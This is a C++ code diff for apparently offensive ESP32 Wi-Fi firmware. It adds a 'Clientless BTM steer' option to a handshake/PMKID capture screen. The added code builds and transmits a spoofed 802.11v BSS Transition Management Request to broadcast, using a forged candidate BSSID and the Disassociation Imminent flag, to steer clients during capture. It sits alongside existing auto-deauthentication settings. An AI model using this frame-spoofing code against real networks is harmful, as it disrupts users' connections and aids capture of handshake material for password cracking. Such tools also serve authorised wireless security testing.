@@ -206,6 +206,50 @@ void HandshakeScreen::update() {
             updateAutoHunt();
         } else {
             capture_.update();
+#ifdef ESP32
+            // Clientless BTM steer (slice-0156): one-shot spoofed BTM Request at a fixed
+            // delay after capture start. Reuses the slice-0155 pure predicate with
+            // pmfRequired/armsSolicitation pinned true (see slice-0156 ## Design) so the
+            // Auto Hunt and Clientless call sites share one piece of policy logic.
+            if (isClientless() && hasTarget_) {
+                const uint32_t elapsed = millis() - clientlessCaptureStartMs_;
+                const utils::BtmInjectInputs btmInputs{
+                    /*pmfRequired=*/       true,
+                    /*steerEnabled=*/      clientlessBtmSteer_,
+                    /*alreadyInjected=*/   btmInjectedClientless_,
+                    /*halfWindowElapsed=*/ elapsed >= CLIENTLESS_BTM_DELAY_MS,
+                    /*armsSolicitation=*/  true,
+                };
+                if (utils::shouldInjectBtm(btmInputs)) {
+                    uint8_t candidate[6];
+                    memcpy(candidate, targetBssid_, 6);
+                    candidate[0] |= 0x02;
+                    candidate[0] &= ~0x01;
+
+                    static constexpr uint8_t kBroadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+                    utils::BtmRequestParams p{};
+                    p.targetBssid        = targetBssid_;
+                    p.destMac            = kBroadcast;
+                    p.candidateBssid     = candidate;
+                    p.dialogToken        = 0x01;
+                    p.requestMode        = static_cast<uint8_t>(utils::BtmRequestModeBit::PreferredCandidateListIncluded)
+                                         | static_cast<uint8_t>(utils::BtmRequestModeBit::DisassociationImminent);
+                    p.disassocTimerTu    = 100;
+                    p.validityIntervalBi = 20;
+                    p.candidateOpClass   = 81;
+                    p.candidateChannel   = targetChannel_;
+                    p.candidatePhyType   = 7;
+
+                    btmInjectedClientless_ = true;
+                    const bool ok = utils::sendBtmRequest(p);
+                    LOG_I("HS", "%s: BTM:injected (unverified, candidate=%02X:%02X:%02X:%02X:%02X:%02X ch=%u) tx=%s",
+                          targetSsid_,
+                          candidate[0], candidate[1], candidate[2], candidate[3], candidate[4], candidate[5],
+                          targetChannel_,
+                          ok ? "ok" : "fail");
+                }
+            }
+#endif
         }
         needsRedraw_ = true;  // Always redraw during capture for live stats
     }
@@ -467,6 +511,15 @@ void HandshakeScreen::handleConfigEdit(int delta) {
         return;
     }
 
+    // Clientless: row 0 is Target (navigation, not editable), row 1 is the BTM steer
+    // toggle (slice-0156), row 2 is START. Only the toggle responds to EditNext/EditPrev.
+    if (isClientless()) {
+        if (configList_.selectedIndex() == 1) {
+            clientlessBtmSteer_ = !clientlessBtmSteer_;
+        }
+        return;
+    }
+
     // Only Manual value rows (1-3) are editable; Target (0) and START (4) have nothing to step.
     // delta>0 advances (ENTER / '/' / '>'), delta<0 steps back (',' / '<').
     switch (configList_.selectedIndex()) {
@@ -550,6 +603,12 @@ void HandshakeScreen::startCapture() {
         config.autoDeauth = false;
         config.timeoutMs = 0;
         pmkidReady_ = false;
+        // Reset the slice-0156 one-shot BTM latch so a re-run of the same target gets a
+        // fresh injection chance, and anchor the delay timer to now.
+        btmInjectedClientless_ = false;
+#ifdef ESP32
+        clientlessCaptureStartMs_ = millis();
+#endif
     } else {
         config.autoDeauth = autoDeauth_;
         config.deauthCount = deauthCount_;
@@ -1283,9 +1342,9 @@ void HandshakeScreen::drawConfig(Canvas& canvas) {
     }
 
     if (isClientless()) {
-        // Clientless PMKID (ADR-0138): Target (row 0, navigation) + START, no deauth/timeout
-        // rows (this mode never deauths). Same shared ScrollableList as Manual so the form
-        // reads identically; just two rows.
+        // Clientless PMKID (ADR-0138): Target (row 0, navigation) + BTM steer (row 1,
+        // slice-0156) + START (row 2). Same shared ScrollableList as Manual so the form
+        // reads identically.
         const int16_t cListTop = HEADER_HEIGHT + 6;
         const int16_t cAvailHeight = canvas.height() - cListTop - FOOTER_HEIGHT - 4;
         configList_.setItemCount(CLIENTLESS_CONFIG_ITEMS);
@@ -1295,9 +1354,17 @@ void HandshakeScreen::drawConfig(Canvas& canvas) {
                     ui::ActionButton::render(c, rowY, "START PMKID", selected);
                     return;
                 }
-                char valueStr[28] = "";
-                formatTargetValue(valueStr, sizeof(valueStr));
-                ui::ConfigRow::render(c, rowY, "Target:", valueStr);
+                if (idx == 0) {
+                    char valueStr[28] = "";
+                    formatTargetValue(valueStr, sizeof(valueStr));
+                    ui::ConfigRow::render(c, rowY, "Target:", valueStr);
+                    return;
+                }
+                // Row 1: BTM steer toggle (slice-0156). Same "(unverified)" honesty gate as the
+                // Auto Hunt row shipped by slice-0155: a spoofed 802.11v BTM Request is a
+                // robust management action that PMF should protect in theory, and no device run
+                // has shown otherwise yet.
+                ui::ConfigRow::render(c, rowY, "BTM steer (unverified):", clientlessBtmSteer_ ? "On" : "Off");
             },
             !footerHints_.hasFocus());
         return;
